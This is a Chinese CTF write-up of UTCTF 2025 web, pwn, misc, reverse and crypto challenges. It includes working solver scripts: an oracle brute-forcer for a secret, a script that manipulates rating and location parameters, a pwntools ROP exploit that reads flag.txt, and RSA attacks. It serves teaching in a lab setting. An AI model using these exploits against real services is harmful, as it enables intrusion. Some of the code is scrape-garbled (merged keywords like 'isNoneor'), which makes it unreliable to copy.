# UTCTF · 2025 WriteUp

> 原文: https://www.ctfiot.com/232193.html
> ID: 232193

我们新点击蓝字

关注我们

声明

本文作者：CTF战队

本文字数：4165字

阅读时长：约35分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

❝

UTCTF · 2025  

关注公众号回复 UTCTF2025 获得比赛附件

https://utctf.live

WEB

OTP

❝

Find your One True Pairing on this new site I made! Whoever has the closest OTP to the “flag” will get their very own date! 
This problem resets every 30 minutes.

http://challenge.utctf.live:
3725

先注册username，lookup会比较username1和username2里的secret的差别，所以依次爆破

import requests
import string
import re
import time
# 配置参数
URL = "http://challenge.utctf.live:
3725/index.php"
HEADERS = {
    "Accept-Encoding": "gzip, deflate",
    "Upgrade-Insecure-Requests": "1",
    "Referer": URL,
    "Origin": URL,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cache-Control": "max-age=0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
}
CHARSET = string.ascii_letters + string.digits + "_-}"
PASSWORD_LENGTH = 32
# 目标密码长度
INITIAL_PASSWORD = "utflag{"
DELAY = 0.3
# 请求间隔(秒)

def brute_password():
    current_password = INITIAL_PASSWORD
    username_counter = 0
# 用户名计数器

    while len(current_password) < PASSWORD_LENGTH:
        print(f"n当前进度: {current_password} ({len(current_password)}/{PASSWORD_LENGTH})")

        # 阶段1: 注册所有候选字符用户
        registered_chars = {}
        for char in CHARSET:
            username = f"Qiany1_{len(current_password)}_{username_counter}"
            password_attempt = current_password + char
            payload = {"username": username, "password": password_attempt}

            try:
                resp = requests.post(URL, headers=HEADERS, data=payload, timeout=5)
                if resp.status_code == 200:
                    registered_chars[char] = username
                    print(f"已注册 {char} -> {username}")
                else:
                    print(f"注册失败 {char} (状态码 {resp.status_code})")
            
except Exception as e:
                print(f"注册异常 {char}: {str(e)}")

            username_counter += 1
            time.sleep(DELAY)

        # 阶段2: 查找最小配对码
        min_pair = None
        selected_char = None

        for char, username in registered_chars.items():
            try:
                payload = {"username1": username, "username2": "flag"}
                resp = requests.post(URL, headers=HEADERS, data=payload, timeout=5)

                if match := re.search(r"is: (d+)", resp.text):
                    pair_value = int(match.group(1))
                    print(f"测试 {char} -> {pair_value}")

                    if min_pair isNoneor pair_value < min_pair:
                        min_pair = pair_value
                        selected_char = char
            
except Exception as e:
                print(f"请求失败 {char}: {str(e)}")

            time.sleep(DELAY)

        if selected_char:
            current_password += selected_char
            print(f"找到新字符: {selected_char} (配对值 {min_pair})")
        else:
            print("未找到有效字符，终止爆破！")
            break

    return current_password

if __name__ == "__main__":
    final_password = brute_password()
    print(f"n爆破完成！最终密码: {final_password}")

爆破

utflag{On3_sT3P_4t_4_t1m3}

Number Champion

❝

The number 1 player in this game, geopy hit 3000 elo last week. I want to figure out where they train to be the best.

Flag is the address of this player (according to google maps), in the following format all lowercase:

utflag{––}

For example, if the address is 110 Inner Campus Drive, Austin, TX 78705, the flag would be utflag{110-inner-campus-drive-austin-78705}

作为这场比赛的头号选手，geopy上周打出了3000埃洛。我想弄清楚他们在哪里训练得最好。

Flag是该玩家的地址（根据谷歌地图），格式如下，全部小写：

utflag{<街道地址>-<城市>-<邮政编码>}

例如，如果地址是110 Inner Campus Drive，Austin，TX 78705，则标记将是utflag{110-Inner-Campus-Drive-Austin-78705} 
https://numberchamp-challenge.utctf.live/

这个网站会请求google，然后要找 geopy 的地址

点 match 匹配不到人，可以在 /register 注册

然后就可以匹配了

lat 和 lon 是经纬度，或许会就近匹配，elo 可能是分数，要找一个 3000elo 的 geopy，它有个battle功能，uuid方一直是输，所以将uuid换为match到的那个uuid，将oppent换为自己的uuid，多进行几次就能让自己的uuid加elo

import requests

# 目标 URL
URL = "https://numberchamp-challenge.utctf.live/battle?uuid=09cb1670-102d-4b5f-b626-e12485dc2e54&opponent=75474cf9-50ca-4f3e-9605-40c8265fa0f7&number=999"
HEADERS = {
    "Accept-Encoding": "gzip, deflate",
    "Upgrade-Insecure-Requests": "1",
    "Referer": URL,
    "Origin": URL,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cache-Control": "max-age=0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
}
for i in range(1,402):
    payload={"1":"1"}
    resp = requests.post(URL, headers=HEADERS, data=payload)
    print(resp.text)

 分数涨上去后就能匹配到geopy，然后通过更改lat和lon减小distance，到一定区间后用脚本进一步缩小范围

import requests
import time

# 目标URL和固定UUID
url = "https://numberchamp-challenge.utctf.live/match"
uuid = "093202cc-cb1f-441c-9ccc-c0e2129c3677"

# 初始坐标和参数设置
current_lat = 39.941500000000474
current_lon = -82.99849999999952
step = 0.001
# 初始搜索步长
min_step = 1e-6
# 最小步长阈值
max_attempts = 500
# 最大尝试次数防止无限循环
delay = 0.1
# 请求间隔防止速率限制

def get_distance(lat, lon):
    """获取指定坐标的distance值"""
    params = {
        'uuid': uuid,
        'lat': round(lat, 6),  # 保留6位小数避免浮点误差
        'lon': round(lon, 6)
    }
    try:
        response = requests.post(url, params=params)

        # 检查响应的状态码
        if response.status_code != 200:
            print(f"请求失败，状态码: {response.status_code}")
            print(f"响应内容: {response.text}")
            returnNone

        # 尝试解析JSON数据
        data = response.json()
        return data.get('distance')
    
except Exception as e:
        print(f"请求出错: {e}")
        print(f"响应内容: {response.text}")
        returnNone

# 主优化循环
for _ in range(max_attempts):
    current_dist = get_distance(current_lat, current_lon)
    if current_dist isNone:
        break

    print(f"尝试坐标: ({current_lat:.6f}, {current_lon:.6f}), Distance: {current_dist:.6f}")

    if current_dist < 0.01:
        print(f"n成功找到坐标！")
        print(f"Latitude: {current_lat:.6f}")
        print(f"Longitude: {current_lon:.6f}")
        print(f"最终distance: {current_dist}")
        exit()

    improved = False

    # 横向调整 (经度)
    new_lon = current_lon + step
    dist_plus = get_distance(current_lat, new_lon)
    if dist_plus < current_dist:
        current_lon = new_lon
        improved = True
    else:
        new_lon = current_lon - step
        dist_minus = get_distance(current_lat, new_lon)
        if dist_minus < current_dist:
            current_lon = new_lon
            improved = True

    # 纵向调整 (纬度)
    ifnot improved:
        new_lat = current_lat + step
        dist_plus = get_distance(new_lat, current_lon)
        if dist_plus < current_dist:
            current_lat = new_lat
            improved = True
        else:
            new_lat = current_lat - step
            dist_minus = get_distance(new_lat, current_lon)
            if dist_minus < current_dist:
                current_lat = new_lat
                improved = True

    # 如果没有改进则减小步长
    ifnot improved:
        step *= 0.5
        print(f"减小步长至: {step:.6f}")
        if step < min_step:
            print("n步长过小，停止搜索")
            break

    time.sleep(delay)

print("n达到最大尝试次数仍未找到")

成功找到坐标！
Latitude: 39.940500
Longitude: -82.996750
最终distance: 0.0063360356638980635

utflag{1059-s-high-st-columbus-43206}

Pwn

secbof

❝

A buffer overflow, but secure. Flag can be accessed at “./flag.txt” 
附件：chal、start.sh、Dockerfile 
nc challenge.utctf.live 5141

from pwn import *
io = remote()

def exp():
    bss = 0x4C82C0
    read = 0x44F8E0
    write = 0x44F980
    rdi_ret = 0x000000000040204f
    rsi_ret = 0x000000000040a0be
    rdx_rbx_ret = 0x000000000048630b
    syscall = 0x000000000041ae16
    rax_ret = 0x0000000000450507

    io.recvuntil(b"Input> ")
    pl = b"A" * (0x80 + 8)
    pl += flat([rdi_ret, 0, rsi_ret, bss+0x200, rdx_rbx_ret, 0x100, 0, read])
    pl += flat([rdi_ret, bss+0x200, rsi_ret, 0, rax_ret, 2, syscall])
    pl += flat([rdi_ret, 5, rsi_ret, bss+0x300, rdx_rbx_ret, 0x100, 0, read])
    pl += flat([rdi_ret, 1, rsi_ret, bss+0x300, rdx_rbx_ret, 0x100, 0, write])
    io.send(pl.ljust(1000, b"x00"))
    io.recvuntil(b"Flag: ")
    io.send(b"./flag.txtx00".ljust(0x100, b"x00"))

 exp()
 io.interactivate()
    

MISC

Trapped in Plain Sight 1

❝

Just try to read my flag. 0x0 
The password is password. 
ssh -p 4301 trapped@challenge.utctf.live

Trapped in Plain Sight 2

❝

Only the chosen may see. 
The password is password. 
ssh -p 4302 trapped@challenge.utctf.live

连进去后：

发现flag启用了ACL扩展权限

secretuser有读命令

Forensics

Streamified

❝

Apparently I’m supposed to scan this or something… but I don’t really get it.
附件:
bitstring.txt

625，25 * 25 的二维码，0白 1黑

from PIL import Image

def string_to_qr(input_string, size=25):
    # 创建一个白色背景的图像
    img = Image.new('1', (size, size), 'white')
    
    # 加载像素数据
    pixels = img.load()
    
    for i in range(size):
        for j in range(size):
            # 根据input_string中的值设置像素颜色
            if input_string[i * size + j] == '1':
                pixels[j, i] = 0
# 黑色
            
    return img

# 示例输入：625个字符长的字符串，由0和1组成
input_data = "1111111000011110101111111100000100110101100100000110111010110110111010111011011101010101001101011101101110101001010010101110110000010100101111010000011111111010101010101111111000000001011110100000000010111110001110110011111000111010101100000010100000100011110111100101110111100000100001010100010000011000001000000001011011111100010001010111011100011010100010101001111100110111011100001001100110000011100001100110101011111111100000000110000001000110101111111001111001101010011100000101101001010001000010111010111100011111111011011101011001110011010011101110101010011110010010110000010011011001011100011111111010101010000010111"# 这里请替换为您的实际输入数据

# 检查输入数据长度是否正确
if len(input_data) != 25*25:
    raise ValueError("输入数据长度必须为625")

# 调用函数生成二维码
qr_image = string_to_qr(input_data)

# 显示二维码
qr_image.show()

# 如果需要保存二维码图像
qr_image.save("qrcode.png")

Reverse

Ostrich Algorithm

❝

The worst algorithm, 
except for all the rest. 
附件:
chal

附件拖入ida。鸵鸟算法指的是忽略潜在问题的一种算法策略。直接运行跳过开头的循环即得

utflag{d686e9b8f13bef2a3078c324ceafd25d}

Retro Cookie Clicker

❝

Gotta click em all! 
附件：retro-cookie-clicker.gb

附件拖入bgb

又是cookie clicker，上周的Ugra里也有一个。尝试从字符串定位数据但是失败了，只好掏出CE，通过搜索单字节找到数据，提示说需要Dozen最大，注意到这两个都是双字节有符号数，所以最大是0x7fff

utflag{1337hax0r}

Safe Word

❝

Those Who Know. 
附件：safe_word

附件拖入ida

使用malloc分配了一块很大的内存，然后紧接着就是一大段对这块内存的初始化赋值

赋值完看运算是根据输入字符在这块内存中取值，取出的值即为要执行的代码，正确的输入对应的值是可以被执行的。调试发现执行的代码都是push XX;pop rax;ret，三行代码对应的值是0xC358XX6A。脚本

s1=[] # 初始化后的0x40000//8=0x8000个64位整数

s2=[]
s2.append((0x5b,''))

while len(s2)!=0:
    end=s2.pop()
    if'}'in end[1]:
        print(end[1])
        continue
    if len(end[1])>0x20:
        continue
    for i in range(32,127,1):
        tmp=(end[0]<<8)|i
        temp=s1[tmp]
        if (temp&0xff)==0x6aand (temp>>16)==0xc358:
            s2.append(((temp>>8)&0xff,end[1]+chr(i)))
        
# utflag{1_w4nna_pl4y_hypix3l_in_c}

Crypto

DCΔ

❝

Due to a national shortage of primes, the US Department of Agriculture is rationing all citizens to a limit of one generated prime number per CTF challenge.
附件：rsa.txt

直接把n扔入factordb会发现是平方数，则n=p**2易知phi=p*(p-1)

n = 399956368360808862373914258335185223080849636197711424060797090309268643429064461492550414549161330948819635837600839124910339139212025975705016633767495247163243281423582407941339197895052969960664399531226116807938480610953640675838340969642399505783577667601230289640157854573282615113017817753471366212008719316238931155299741896658264134636523008018510523774126757209492757800553768281613227711738371473830681563493341816035127889532515105148615575695347672918819305383651095344758737833444302556494599778991752161562622963652164008980839152347260377969421014616624263631920322958235478733540894255954351848359580013695597870908080170511403061620632540407634608773118202473287854599776791229532885611074739079107324575619148211269673210431496846247978541032947073060592123529635361112170678347924377962162254827262375685704046691718585952854410058401794022674628779309507437739620598639589987596443373586284136126401843497367142210715014480599609277532331148988390798073713743339823218981940779096432112651466716648010370850152213399051968069102663753404120592506704133217642671853086570223710424683386625314802805217882906873879240914022607713870946351691046929143491841506422542038315876506588525639983398522454145866029283449
e = 65537
c = 22644125297186385803212285721101686380290089858624593588464228942417644877688212364383835956263619653769244324906844180248816686517049952319431524113838480708352331162026595736354019259708442449783760846242702532176456117138374450898213788623580234048867117546091028843127595147910526821835855070663317466469650577618010308109119812464711010326075908158768138773973732088207030977470605554056485614676156104134673446546446752627654287202815354367643042773923258958887865030737447323798382020847653880886311162447594373201951226217556835030816588457674298560260109378271244834215832992407457137601161490484862135147963942227371690835380497920998286827898323068399708168699403459009009580152834747843780155917438758224782364193716322974594031272100820264364860227674838730962348140555980411714722361909800417953974064469599278274083750031569853934963716467881656073359393449142980936480726005445774158733389270553554093627622406166942859792490275434896108377393648278975530519769034633686070931694499857110956537102727286491854314244036392929790997824274724196292688659782806587688964714529943288954314300861531138101192901942534064757877725334672680909389193357725470116673323012331269218651347104807494994267835408427908717684178629

from Crypto.Util.number import *
from gmpy2 import*

p=iroot(n,2)[0]

phi=p*(p-1)
d=inverse(e,phi)
m=pow(c,d,n)
print(long_to_bytes(m))
#utflag{th3_t0t13nt_funct10n_uns1mpl1f13d}

RSA

❝

Idk why people make e so large for rsa… it’s so much easier to just use 3. Why use big number when small number do trick? 
附件：rsa.txt

读题知e=3，则联想到小明文攻击，直接上通杀脚本

n= 21507386633439519550169998646896627263990342978145866337442653437291500212804540039826669967421406761783804525632864075787433199834243745244830254423626433057121784913173342863755047712719972310827106310978325541157116399004997956022957497614561358547338887866829687642469922480325337783646738698964794799137629074290136943475809453339879850896418933264952741717996251598299033247598332283374311388548417533241578128405412876297518744631221434811566527970724653020096586968674253730535704100196440896139791213814925799933321426996992353761056678153980682453131865332141631387947508055668987573690117314953760510812159
e=3
c= 6723702102195566573155033480869753489283107574855029844328060266358539778148984297827300182772738267875181687326892460074882512254133616280539109646843128644207390959955541800567609034853

from Crypto.Util.number import *
from gmpy2 import *

k = 0

t = gmpy2.iroot(c,e)
if t[1]:
    print(long_to_bytes(t[0]))
else:
    while1:
        m = gmpy2.iroot(k*n+c,e)
        if m[1]:
            print(long_to_bytes(m[0]))
            break
        else:
            k += 1
#utflag{hmm_maybe_bad_idea}

Autokey Cipher

❝

I know people say you can do a frequency analysis on autokey ciphers over long text, but the flag is short so it’ll be fine. 
lpqwma{rws_ywpqaauad_rrqfcfkq_wuey_ifwo_xlkvxawjh_pkbgrzf}

我知道人们说你可以对长文本的自动密钥密码进行频率分析，但标志很短，所以没问题。

题目告诉我是自动密钥密码，目前参考了L佬的blog的脚本https://lazzzaro.github.io/2020/06/14/crypto-自动密钥密码/index.html 

但是解出的有效信息是UTFLAGWHYFREQUENCYANALYSISWHENKNOWBEGINNINGLETTERS 

提示我说已知flag头为什么用频率分析，然后我尝试Pi=(Ci−Ki)mod26去进行解密，推出的密钥是RWLLMU

lpqwma{rws_ywpqaauad_rrqfcfkq_wuey_ifwo_xlkvxawjh_pkbgrzf}

转小写，按照 flag 格式

utflag{why_frequency_analysis_when_know_beginning_letters}

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
import requests
import string
import re
import time
# 配置参数
URL = "http://challenge.utctf.live:
3725/index.php"
HEADERS = {
    "Accept-Encoding": "gzip, deflate",
    "Upgrade-Insecure-Requests": "1",
    "Referer": URL,
    "Origin": URL,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cache-Control": "max-age=0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
}
CHARSET = string.ascii_letters + string.digits + "_-}"
PASSWORD_LENGTH = 32
# 目标密码长度
INITIAL_PASSWORD = "utflag{"
DELAY = 0.3
# 请求间隔(秒)

def brute_password():
    current_password = INITIAL_PASSWORD
    username_counter = 0
# 用户名计数器

    while len(current_password) < PASSWORD_LENGTH:
        print(f"n当前进度: {current_password} ({len(current_password)}/{PASSWORD_LENGTH})")

        # 阶段1: 注册所有候选字符用户
        registered_chars = {}
        for char in CHARSET:
            username = f"Qiany1_{len(current_password)}_{username_counter}"
            password_attempt = current_password + char
            payload = {"username": username, "password": password_attempt}

            try:
                resp = requests.post(URL, headers=HEADERS, data=payload, timeout=5)
                if resp.status_code == 200:
                    registered_chars[char] = username
                    print(f"已注册 {char} -> {username}")
                else:
                    print(f"注册失败 {char} (状态码 {resp.status_code})")
            
except Exception as e:
                print(f"注册异常 {char}: {str(e)}")

            username_counter += 1
            time.sleep(DELAY)

        # 阶段2: 查找最小配对码
        min_pair = None
        selected_char = None

        for char, username in registered_chars.items():
            try:
                payload = {"username1": username, "username2": "flag"}
                resp = requests.post(URL, headers=HEADERS, data=payload, timeout=5)

                if match := re.search(r"is: (d+)", resp.text):
                    pair_value = int(match.group(1))
                    print(f"测试 {char} -> {pair_value}")

                    if min_pair isNoneor pair_value < min_pair:
                        min_pair = pair_value
                        selected_char = char
            
except Exception as e:
                print(f"请求失败 {char}: {str(e)}")

            time.sleep(DELAY)

        if selected_char:
            current_password += selected_char
            print(f"找到新字符: {selected_char} (配对值 {min_pair})")
        else:
            print("未找到有效字符，终止爆破！")
            break

    return current_password

if __name__ == "__main__":
    final_password = brute_password()
    print(f"n爆破完成！最终密码: {final_password}")
import requests

# 目标 URL
URL = "https://numberchamp-challenge.utctf.live/battle?uuid=09cb1670-102d-4b5f-b626-e12485dc2e54&opponent=75474cf9-50ca-4f3e-9605-40c8265fa0f7&number=999"
HEADERS = {
    "Accept-Encoding": "gzip, deflate",
    "Upgrade-Insecure-Requests": "1",
    "Referer": URL,
    "Origin": URL,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cache-Control": "max-age=0",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
}
for i in range(1,402):
    payload={"1":"1"}
    resp = requests.post(URL, headers=HEADERS, data=payload)
    print(resp.text)
import requests
import time

# 目标URL和固定UUID
url = "https://numberchamp-challenge.utctf.live/match"
uuid = "093202cc-cb1f-441c-9ccc-c0e2129c3677"

# 初始坐标和参数设置
current_lat = 39.941500000000474
current_lon = -82.99849999999952
step = 0.001
# 初始搜索步长
min_step = 1e-6
# 最小步长阈值
max_attempts = 500
# 最大尝试次数防止无限循环
delay = 0.1
# 请求间隔防止速率限制

def get_distance(lat, lon):
    """获取指定坐标的distance值"""
    params = {
        'uuid': uuid,
        'lat': round(lat, 6),  # 保留6位小数避免浮点误差
        'lon': round(lon, 6)
    }
    try:
        response = requests.post(url, params=params)

        # 检查响应的状态码
        if response.status_code != 200:
            print(f"请求失败，状态码: {response.status_code}")
            print(f"响应内容: {response.text}")
            returnNone

        # 尝试解析JSON数据
        data = response.json()
        return data.get('distance')
    
except Exception as e:
        print(f"请求出错: {e}")
        print(f"响应内容: {response.text}")
        returnNone

# 主优化循环
for _ in range(max_attempts):
    current_dist = get_distance(current_lat, current_lon)
    if current_dist isNone:
        break

    print(f"尝试坐标: ({current_lat:.6f}, {current_lon:.6f}), Distance: {current_dist:.6f}")

    if current_dist < 0.01:
        print(f"n成功找到坐标！")
        print(f"Latitude: {current_lat:.6f}")
        print(f"Longitude: {current_lon:.6f}")
        print(f"最终distance: {current_dist}")
        exit()

    improved = False

    # 横向调整 (经度)
    new_lon = current_lon + step
    dist_plus = get_distance(current_lat, new_lon)
    if dist_plus < current_dist:
        current_lon = new_lon
        improved = True
    else:
        new_lon = current_lon - step
        dist_minus = get_distance(current_lat, new_lon)
        if dist_minus < current_dist:
            current_lon = new_lon
            improved = True

    # 纵向调整 (纬度)
    ifnot improved:
        new_lat = current_lat + step
        dist_plus = get_distance(new_lat, current_lon)
        if dist_plus < current_dist:
            current_lat = new_lat
            improved = True
        else:
            new_lat = current_lat - step
            dist_minus = get_distance(new_lat, current_lon)
            if dist_minus < current_dist:
                current_lat = new_lat
                improved = True

    # 如果没有改进则减小步长
    ifnot improved:
        step *= 0.5
        print(f"减小步长至: {step:.6f}")
        if step < min_step:
            print("n步长过小，停止搜索")
            break

    time.sleep(delay)

print("n达到最大尝试次数仍未找到")

成功找到坐标！
Latitude: 39.940500
Longitude: -82.996750
最终distance: 0.0063360356638980635
from pwn import *
io = remote()

def exp():
    bss = 0x4C82C0
    read = 0x44F8E0
    write = 0x44F980
    rdi_ret = 0x000000000040204f
    rsi_ret = 0x000000000040a0be
    rdx_rbx_ret = 0x000000000048630b
    syscall = 0x000000000041ae16
    rax_ret = 0x0000000000450507

    io.recvuntil(b"Input> ")
    pl = b"A" * (0x80 + 8)
    pl += flat([rdi_ret, 0, rsi_ret, bss+0x200, rdx_rbx_ret, 0x100, 0, read])
    pl += flat([rdi_ret, bss+0x200, rsi_ret, 0, rax_ret, 2, syscall])
    pl += flat([rdi_ret, 5, rsi_ret, bss+0x300, rdx_rbx_ret, 0x100, 0, read])
    pl += flat([rdi_ret, 1, rsi_ret, bss+0x300, rdx_rbx_ret, 0x100, 0, write])
    io.send(pl.ljust(1000, b"x00"))
    io.recvuntil(b"Flag: ")
    io.send(b"./flag.txtx00".ljust(0x100, b"x00"))

 exp()
 io.interactivate()
from PIL import Image

def string_to_qr(input_string, size=25):
    # 创建一个白色背景的图像
    img = Image.new('1', (size, size), 'white')
    
    # 加载像素数据
    pixels = img.load()
    
    for i in range(size):
        for j in range(size):
            # 根据input_string中的值设置像素颜色
            if input_string[i * size + j] == '1':
                pixels[j, i] = 0
# 黑色
            
    return img

# 示例输入：625个字符长的字符串，由0和1组成
input_data = "1111111000011110101111111100000100110101100100000110111010110110111010111011011101010101001101011101101110101001010010101110110000010100101111010000011111111010101010101111111000000001011110100000000010111110001110110011111000111010101100000010100000100011110111100101110111100000100001010100010000011000001000000001011011111100010001010111011100011010100010101001111100110111011100001001100110000011100001100110101011111111100000000110000001000110101111111001111001101010011100000101101001010001000010111010111100011111111011011101011001110011010011101110101010011110010010110000010011011001011100011111111010101010000010111"# 这里请替换为您的实际输入数据

# 检查输入数据长度是否正确
if len(input_data) != 25*25:
    raise ValueError("输入数据长度必须为625")

# 调用函数生成二维码
qr_image = string_to_qr(input_data)

# 显示二维码
qr_image.show()

# 如果需要保存二维码图像
qr_image.save("qrcode.png")
s1=[] # 初始化后的0x40000//8=0x8000个64位整数

s2=[]
s2.append((0x5b,''))

while len(s2)!=0:
    end=s2.pop()
    if'}'in end[1]:
        print(end[1])
        continue
    if len(end[1])>0x20:
        continue
    for i in range(32,127,1):
        tmp=(end[0]<<8)|i
        temp=s1[tmp]
        if (temp&0xff)==0x6aand (temp>>16)==0xc358:
            s2.append(((temp>>8)&0xff,end[1]+chr(i)))
        
# utflag{1_w4nna_pl4y_hypix3l_in_c}
n = 399956368360808862373914258335185223080849636197711424060797090309268643429064461492550414549161330948819635837600839124910339139212025975705016633767495247163243281423582407941339197895052969960664399531226116807938480610953640675838340969642399505783577667601230289640157854573282615113017817753471366212008719316238931155299741896658264134636523008018510523774126757209492757800553768281613227711738371473830681563493341816035127889532515105148615575695347672918819305383651095344758737833444302556494599778991752161562622963652164008980839152347260377969421014616624263631920322958235478733540894255954351848359580013695597870908080170511403061620632540407634608773118202473287854599776791229532885611074739079107324575619148211269673210431496846247978541032947073060592123529635361112170678347924377962162254827262375685704046691718585952854410058401794022674628779309507437739620598639589987596443373586284136126401843497367142210715014480599609277532331148988390798073713743339823218981940779096432112651466716648010370850152213399051968069102663753404120592506704133217642671853086570223710424683386625314802805217882906873879240914022607713870946351691046929143491841506422542038315876506588525639983398522454145866029283449
e = 65537
c = 22644125297186385803212285721101686380290089858624593588464228942417644877688212364383835956263619653769244324906844180248816686517049952319431524113838480708352331162026595736354019259708442449783760846242702532176456117138374450898213788623580234048867117546091028843127595147910526821835855070663317466469650577618010308109119812464711010326075908158768138773973732088207030977470605554056485614676156104134673446546446752627654287202815354367643042773923258958887865030737447323798382020847653880886311162447594373201951226217556835030816588457674298560260109378271244834215832992407457137601161490484862135147963942227371690835380497920998286827898323068399708168699403459009009580152834747843780155917438758224782364193716322974594031272100820264364860227674838730962348140555980411714722361909800417953974064469599278274083750031569853934963716467881656073359393449142980936480726005445774158733389270553554093627622406166942859792490275434896108377393648278975530519769034633686070931694499857110956537102727286491854314244036392929790997824274724196292688659782806587688964714529943288954314300861531138101192901942534064757877725334672680909389193357725470116673323012331269218651347104807494994267835408427908717684178629

from Crypto.Util.number import *
from gmpy2 import*

p=iroot(n,2)[0]

phi=p*(p-1)
d=inverse(e,phi)
m=pow(c,d,n)
print(long_to_bytes(m))
    #utflag{th3_t0t13nt_funct10n_uns1mpl1f13d}
n= 21507386633439519550169998646896627263990342978145866337442653437291500212804540039826669967421406761783804525632864075787433199834243745244830254423626433057121784913173342863755047712719972310827106310978325541157116399004997956022957497614561358547338887866829687642469922480325337783646738698964794799137629074290136943475809453339879850896418933264952741717996251598299033247598332283374311388548417533241578128405412876297518744631221434811566527970724653020096586968674253730535704100196440896139791213814925799933321426996992353761056678153980682453131865332141631387947508055668987573690117314953760510812159
e=3
c= 6723702102195566573155033480869753489283107574855029844328060266358539778148984297827300182772738267875181687326892460074882512254133616280539109646843128644207390959955541800567609034853

from Crypto.Util.number import *
from gmpy2 import *

k = 0

t = gmpy2.iroot(c,e)
if t[1]:
    print(long_to_bytes(t[0]))
else:
    while1:
        m = gmpy2.iroot(k*n+c,e)
        if m[1]:
            print(long_to_bytes(m[0]))
            break
        else:
            k += 1
    #utflag{hmm_maybe_bad_idea}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-c1791da0e1cf4ba822cbb9abb096f2ce.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-2f51c95e7f9c72a1aa448b3e956af10b.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-cab46db2439b6b016446f2b77c8762ba.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-f5018bb64328f6688609d89ced55ea10.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-16d6d4898bffb4c8bb18868122ae40f8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-e1b9a565f1ad533a26c7beafe09260ba.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-401df2c373d12d2c0101a3a04a094839.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-b908cbdda76030a57bb2b0d9f717f834.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-0acc0857810e8d8c6de785067924b0ad.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/03/wxsync-2025-03-f1cb0a977400335fd679371d8679989b.png)